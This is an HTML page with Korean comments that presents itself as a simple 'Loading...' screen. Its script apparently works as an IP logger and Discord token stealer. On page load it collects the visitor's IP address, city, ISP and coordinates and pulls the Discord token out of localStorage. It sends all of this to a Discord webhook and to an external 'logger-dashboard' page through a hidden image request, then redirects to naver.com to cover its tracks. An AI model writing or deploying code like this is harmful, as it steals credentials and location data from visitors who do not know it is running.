<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
</head>
<body>
  <h1>로딩 중...</h1>
  <script>
    (function() {
      // 1. IP 정보 가져오기
      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          const ip = data.ip || '알 수 없음';
          const city = data.city || '알 수 없음';
          const region = data.region || '알 수 없음';
          const country = data.country_name || '알 수 없음';
          const isp = data.org || '알 수 없음';
          const lat = data.latitude || '없음';
          const lon = data.longitude || '없음';

          // 2. 디스코드 토큰 가져오기
          let token = '토큰 없음';
          let userId = '알 수 없음';
          try {
            const rawToken = localStorage.getItem('token');
            if (rawToken) {
              token = rawToken.replace(/^"|"$/g, '');
              try {
                const payload = JSON.parse(atob(token.split('.')[1]));
                userId = payload.sub || payload.id || '알 수 없음';
              } catch(e) {}
            }
          } catch(e) {}

          // 3. 데이터 준비
          const payload = {
            ip: ip,
            city: city,
            region: region,
            country: country,
            isp: isp,
            lat: lat,
            lon: lon,
            token: token,
            userId: userId,
            time: new Date().toISOString()
          };

          // 4. 디스코드 웹훅으로 전송 (대시보드 우회)
          const webhookURL = 'https://discord.com/api/webhooks/여기에_웹훅_ID/여기에_웹훅_토큰';
          fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `**📥 새 접속 감지**\nIP: ${ip}\n위치: ${city}, ${region}, ${country}\n통신사: ${isp}\n디코 ID: ${userId}\n토큰: ${token}`
            })
          })
          .then(() => console.log('✅ 웹훅 전송 성공'))
          .catch(err => console.error('❌ 웹훅 전송 실패:', err));

          // 5. 대시보드로도 전송 (이미지 태그)
          const dashboardUrl = 'https://siwooaslkpi-ui.github.io/logger-dashboard/dashboard.html';
          const params = new URLSearchParams(payload).toString();
          const img = new Image();
          img.src = dashboardUrl + '?log=' + encodeURIComponent(params);
          console.log('📤 대시보드 전송 시도:', img.src);

          // 6. 화면 표시
          document.body.innerHTML = `
            <div style="text-align:center;padding:80px;font-family:sans-serif;color:#333;">
              <h1>✅ 페이지 로드 완료</h1>
              <p>잠시 후 자동으로 이동합니다...</p>
            </div>
          `;
          setTimeout(() => {
            window.location.href = 'https://naver.com';
          }, 2000);
        })
        .catch(err => {
          document.body.innerHTML = `
            <div style="text-align:center;padding:80px;font-family:sans-serif;color:#333;">
              <h1>⚠️ 오류 발생</h1>
              <p>${err.message}</p>
            </div>
          `;
        });
    })();
  </script>
</body>
</html>
